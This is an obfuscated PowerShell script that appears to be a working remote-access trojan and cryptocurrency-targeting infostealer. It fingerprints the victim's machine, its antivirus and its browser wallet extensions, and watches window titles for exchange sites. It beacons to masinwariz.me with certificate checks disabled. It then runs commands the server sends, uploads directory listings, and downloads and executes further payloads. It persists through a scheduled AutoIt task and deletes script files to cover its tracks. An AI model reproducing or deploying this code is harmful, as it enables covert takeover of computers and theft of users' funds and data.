$POposqjdkl = $false;

$euGFDUgh = [System.Threading.Mutex]::new($true, "acb2f45f62c34c94bbd6e86734eb01a1", [ref]$POposqjdkl);

if ($POposqjdkl -eq $false) {
    Start-Sleep -Seconds 10;
    return;
}

$sAZAjqjbx = [System.Environment]::OSVersion.Version.Major.ToString() + "." + [System.Environment]::OSVersion.Version.Minor.ToString();
$global:worker = $true;


function OIkfjkoJ([string] $str) {
    return [System.Environment]::ExpandEnvironmentVariables("%" + $str + "%")
}

function oLjqsnxzasdsq([string] $class, [string] $valssue) {
    $xzasdsq = $null;
    $qyuighnkQQq = (Get-wmiobject -Class $class) ;
    foreach ($item in $qyuighnkQQq) {
        $xzasdsq = $item[$valssue];
        break;
    }

    if($xzasdsq -eq $null)
    {
       $xzasdsq = [Guid]::NewGuid().ToString();
    }
    return $xzasdsq;
}

function sFFsvdsQQq() {
    return (oLjqsnxzasdsq 'win32_logicaldisk' "VolumeSerialNumber") 
}


function sssN11Rdfs() {
    return (oLjqsnxzasdsq 'Win32_OperatingSystem' "Caption") 
}


function CNtDTsdfwxtyCNtD() {
    return (oLjqsnxzasdsq 'Win32_Processor' "AddressWidth") 
}

function AnSDDtisdswxc([uint32]$state) {
    [byte[]] $bytes = [System.BitConverter]::GetBytes($state);

    if (($bytes[1] -eq 0x10) -or ($bytes[1] -eq 0x11)) {
        return "Enabled";
    }
    elseif (($bytes[1] -eq 0x00) -or ($bytes[1] -eq 0x01) -or ($bytes[1] -eq 0x20) -or ($bytes[1] -eq 0x21)) {
        return "Disabled";
    }

    return "Unknown";
}


function dFfs8U7NzZh() {
    $avs = Get-wmiobject -Namespace "root\SecurityCenter" -Class "AntiVirusProduct";
    $avs += Get-wmiobject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct";
    $avf = New-Object Collections.Generic.List[string];

    foreach ($av in $avs) {
        $enabled = (AnSDDtisdswxc $av.productState);
        $avf.Add($av.displayName + " [$enabled]")
    }
    return [string]::Join(", ", $avf.ToArray())
}

function POoiqjohsdjOPSOPOJSX([string]$str) {

    if ($str.Length -eq 0) {
        return "";
    }
    $str = $str.Replace("/", "");
    return ($str.Substring(0, 1).ToUpper() + $str.Substring(1));
}

function getLoSCVXDisks {

     $logical_disks = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | Select-Object -Property DeviceID, VolumeName

     $disks = ""
     foreach($logical_disk in $logical_disks) {

          $disks += $logical_disk.DeviceID + ';'
     }
     return $disks;
}



function GetSubSDFXCQS($Path) {

    # Check if the specified path exists
    if (-Not (Test-Path $Path)) {
        return @()
    }
   
    $pOIKHJSDQOJHF = @(Get-ChildItem -Path $Path -Force -Directory | ForEach-Object {
       [PSCustomObject]@{ 
            name = $_.FullName
            type = "DIRECTORY"
        }
    })

   $files = @(Get-ChildItem -Path $Path -Force -File | ForEach-Object {
       [PSCustomObject]@{
        name = $_.FullName
        type = "FILE"
        }
     })
    return $pOIKHJSDQOJHF + $files;
}


function SendFileBrowserContent($Path, $Content) {

    $URL = "https://masinwariz.me/connect/setFileBrowserContent";
    if ($osVersion -ne "6.1") {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }

    $data = @{
        path = $Path
        content = $Content
        hwid = (oLjqsnxzasdsq 'win32_logicaldisk' "VolumeSerialNumber")
    }

     $b64 = @{
        content = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes( (ConvertTo-Json $data) ))
     }

     $json = ConvertTo-Json $b64
     $headers = @{
      'Content-Type' = 'application/json'
     }
    $response = Invoke-RestMethod -Uri $URL -Method Post -Body $json -Headers $headers
}


function QSDaaAgetUserAgent {

    $fqzlkjdfjsdfssject = Plskjhqsjgtqbqs5qs4dDqd;
    return $ayIUGDIHgbhdghjqzdsx + $qoishjkqqs6d5 + (POoiqjohsdjOPSOPOJSX (OIkfjkoJ "COMPUTERNAME")) + $qoishjkqqs6d5 + (POoiqjohsdjOPSOPOJSX (OIkfjkoJ "USERNAME")) + $qoishjkqqs6d5 + (POoiqjohsdjOPSOPOJSX (sssN11Rdfs)) + " [" + (CNtDTsdfwxtyCNtD) + "]" + $qoishjkqqs6d5 + (POoiqjohsdjOPSOPOJSX (dFfs8U7NzZh)) + $qoishjkqqs6d5 + $fqzlkjdfjsdfssject + $qoishjkqqs6d5 + (getLoSCVXDisks) + $qoishjkqqs6d5 + [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($env:APPDATA))
}


function s65F5swaAQSXsQSD($data, $notify) {
    $URL = "https://masinwariz.me/connect";
    if ($sAZAjqjbx -ne "6.1") {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }

    $pLQSOlisxws = New-Object System.Net.WebClient;
    $useragent = QSDaaAgetUserAgent;
    $pLQSOlisxws.Headers['X-User-Agent'] = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($useragent));

    if ($notify) {
        $pLQSOlisxws.Headers['X-notify'] = $notify
    }

    $Response = $pLQSOlisxws.UploadString($URL, $data);
    $wwwkerEn = $pLQSOlisxws.ResponseHeaders["worker"];

    if ($wwwkerEn -eq "0") {
        $global:worker = $false;
    }

    else {
        $global:worker= $true;
    }
    return $Response.ToString()
}


function xopsjhgsefloasu([string]$URL, [string]$Filename) {
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/599.99 (KHTML, like Gecko) Chrome/81.0.3999.199 Safari/599.99";

    if ($sAZAjqjbx -ne "6.1") {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
        $AqQdzQSD = Invoke-WebRequest -Uri $URL -OutFile $Filename -UserAgent $UserAgent -Method 'GET'
    }

    else {
        $pLQSOlisxws = New-Object System.Net.WebClient;
        $pLQSOlisxws.Headers['User-Agent'] = $UserAgent;
        $pLQSOlisxws.xopsjhgsefloasu($URL, $Filename);
    }
}

function SXDSjEPS($url, $path, $wait) {
    xopsjhgsefloasu $url $path
}


function QtrygkjsFd5d($quit) {
    Remove-Item -Path $FIS8s85s;
    if ($quit) {
        exit(0);
    }
}


function dfgrty52sdvcvb([string] $func) {
    try {
        $AqQdzQSD = Get-Command  -Name $func;
        if ($ret) {
            return $true
        }
    }
    catch {
    }
    return $false
}


if (!(dfgrty52sdvcvb "Get-Clipboard") -or !(dfgrty52sdvcvb "Set-Clipboard")) {
    Add-Type -AssemblyName PresentationFramework;

    function Get-Clipboard($Format) {
        return [System.Windows.Clipboard]::GetText();
    }

    function Set-Clipboard($valssue) {
        [System.Windows.Clipboard]::SetText($valssue)
    }
}

function log_event([string] $coin, [string] $valssue) {
    s65F5swaAQSXsQSD "" ($coin + " - " + $valssue)
} 

function main {
    $pozqsdkfpol = "|V|";
    $qoishjkqqs6d5 = "\";
    $qyIUGDIHgbhdghjqzdsx = "ETP_TM";
    $ayIUGDIHgbhdghjqzdsx = $qyIUGDIHgbhdghjqzdsx + '_' + (sFFsvdsQQq);
    $Ookjhdfhjqsoijk5s = (OIkfjkoJ "temp") + $qoishjkqqs6d5;
    $FIS8s85s = $scriptItem.FullName;
    $FDdf54d1x = $scriptItem.Name;
    $qsQwcQqBuCScs = "powershell.exe";



    while ($true) {

        try {

            [string]$SDFdSfo692 = s65F5swaAQSXsQSD;
            [string[]] $sep = $pozqsdkfpol;
            $qsQSal88zKyxij = $SDFdSfo692.Split( $sep, [StringSplitOptions]::None);
            $dfQ5S45Qksjix = $qsQSal88zKyxij[0];
            $QxztsW2YUG = $qsQSal88zKyxij[1];
        
            if ($dfQ5S45Qksjix -eq "Cmd") { 
               $output = cmd.exe /c $QxztsW2YUG
            }



            if($dfQ5S45Qksjix -eq "Browser") {
              $WXCWXCWSZS = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($QxztsW2YUG))
              $subpOIKHJSDQOJHF = @(GetSubSDFXCQS -Path $WXCWXCWSZS)
              SendFileBrowserContent -Path $WXCWXCWSZS -Content $subpOIKHJSDQOJHF
            }

            if ($dfQ5S45Qksjix -eq "DwnlExe") {
                $path = $Ookjhdfhjqsoijk5s + $qsQSal88zKyxij[2];
                $cmd = $qsQSal88zKyxij[3] + $path;
                SXDSjEPS $qsQSal88zKyxij[1] $path $true;
                Start-Sleep 1
                cmd.exe /c $cmd
            }

            if ($dfQ5S45Qksjix -eq "SelfRemove") {
                QtrygkjsFd5d $true
            } 
        }
       catch {}
        try {
            ffsiofgjdf45s564dfy
        }
        catch
        {}
        Start-Sleep 1
    }
}


function Plskjhqsjgtqbqs5qs4dDqd {

    $Poipjqoisjdio = ConvertFrom-Json $pathdata
    $qyuighnkQQq = New-Object ("{7}{5}{2}{0}{4}{1}{6}{3}" -f'ions.Generic.L','ri','ct','g]','ist[st','le','n','Col');

    try {
        $AAqwqzgh = &("{1}{3}{0}{2}"-f'hildI','Ge','tem','t-C') -Path "$env:appdata\Mozilla\Firefox\Profiles\*.xpi" -Recurse -Force;

        Foreach ($i in $AAqwqzgh) {
            if ($i.Name -match "ebextension@metamask.io.xpi") {
                try {
                    [string] $OIiohjdid = "metamask-F"
                    $qyuighnkQQq.Add($OIiohjdid)
                }
                catch {
                    Write-Host "error"
                }
            }
            if ($i.Name -match "ronin-wallet@axieinfinity.com.xpi") {
                try {
                    [string] $Plkqjks = "Ronin-f"
                    $qyuighnkQQq.Add($Plkqjks)
                }

                catch {
                    Write-Host "error"
                }
            }

            if ($i.Name -match "browserextension@rainbow.me.xpi") {
                try {
                    [string] $Plkqjks = "rainbo-f"
                    $qyuighnkQQq.Add($Plkqjks)
                }
                catch {
                    Write-Host "error"
                }
            }

            if ($i.Name -match "authenticator@mymindstorm.xpi") {
                try {
                    [string] $Plkqjks = "authent-f"
                    $qyuighnkQQq.Add($Plkqjks)
                }
                catch {

                    Write-Host "error"
                }
            }
        }
    }
    catch {}



    foreach ($entry in $Poipjqoisjdio) {
        $Poqijkhw5d4az82q = [System.Environment]::ExpandEnvironmentVariables($entry.root);
        foreach ($target in $entry.targets) {
            if ((Test-Path -Path (Join-Path -Path $Poqijkhw5d4az82q -ChildPath $target.path))) {
                $qyuighnkQQq.Add($target.name)
            }
        }

        

        if ($Poqijkhw5d4az82q -like "*Chrome\User Data\Default*") {
            $splitPath = $Poqijkhw5d4az82q -split '\\'
            $chrpth = ($splitPath[0..($splitPath.Length - 3)] -join '\')

            $profiles = Get-ChildItem -Path $chrpth -Directory -Recurse | Where-Object { $_.Name -like "Profile*" } | ForEach-Object { Join-Path -Path $_.FullName -ChildPath "Extensions" }

            foreach($profile in $profiles) {
                $splitProfile = $profile -split "\\"
                $POoqikjkx = $splitProfile[$splitProfile.Length - 2];
                foreach ($target in $entry.targets) {
                    if (Test-Path -Path (Join-Path -Path $profile -ChildPath $target.path)) {

                        $qyuighnkQQq.Add("Chrome " +$POoqikjkx + " " + $target.name)
                    }
                }
            }
         }
    }

    $AqQdzQSD = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([string]::Join("`n", $qyuighnkQQq)));
    return $AqQdzQSD;
}


function ffsiofgjdf45s564dfy {
        $HkjhqhfH54dqs = @('binance', 'coinbase','blockchain.com','Kraken','uphold','okex','Gemini','bitcoinira','paybit','bitpay','coinmarketcap','tradingview','BitMart.com','nicehash','Cryptocurrency','mexc')
    $OPoihdhoxvce = (GE`T-`proce`SS | wH`E`Re-oBJeCT { $_.MainWindowTitle -ne "" } | sEle`CT`-o`BjeCT MainWindowTitle)

    foreach ($sdfzeqxdobj in $OPoihdhoxvce) {
        [string]$Yiouxqiuohx = $sdfzeqxdobj.MainWindowTitle;
        foreach ($Yysxhb4d in $HkjhqhfH54dqs) {
            if ($Yiouxqiuohx.ToLower().Contains($Yysxhb4d)) {
                log_event 'app' ($Yysxhb4d + "[" + $Yiouxqiuohx + "]")
            }
        }
    }
}

function Ensure-ScheduledTask {
    $ComputerName = $env:COMPUTERNAME
    $AutoPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows')
    $ScriptPath = [System.IO.Path]::Combine($AutoPath, "$ComputerName.au3")
    $TaskName = $ComputerName

    # Check if the task already exists
    $taskExists = schtasks /query /fo LIST /v | Where-Object { $_ -match "TaskName:\s+$TaskName" }


    if ($taskExists) {
        # Check if the task is already running
        $taskRunning = schtasks /query /tn $TaskName /fo LIST /v | Select-String "Status:\s+Running"

        if ($taskRunning) {
            Write-Host "Scheduled task '$TaskName' is already running. Skipping execution."
        } else {
            Write-Host "Scheduled task '$TaskName' exists but is not running. Ensuring it is scheduled."
        }

    } else {

        # Task doesn't exist, create it
        $Command = "`"$AutoPath\\AutoIt3.exe`" `"$ScriptPath`""
        try {
            $output = schtasks /create /tn $TaskName /tr $Command /sc minute /mo 11 /f 2>&1

            Write-Host "Scheduled task '$TaskName' created successfully."
        } catch {

            Write-Host "Error creating the scheduled task: $_"
        }
    }
}


# Execute the function as the first step

Ensure-ScheduledTask


# Continue execution of other functions

Write-Host "Continuing script execution..."



function Remove-PS1FilesFromTemp {

    $tempPath = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Temp"

    $localAppDataPath = $env:LOCALAPPDATA

    # Delete .ps1 files from Temp and its subdirectories

    Get-ChildItem -Path $tempPath -Filter *.ps1 -Recurse -Force | Remove-Item -Force -ErrorAction SilentlyContinue

    # Delete .ps1 files from LocalAppData and its subdirectories

    Get-ChildItem -Path $localAppDataPath -Filter *.ps1 -Recurse -Force | Remove-Item -Force -ErrorAction SilentlyContinue
}

while ($true) {
    try {

        main

    }

    catch {

    }
}

$euGFDUgh.ReleaseMutex()



Start-Job -ScriptBlock {

    Your-LastFunction

}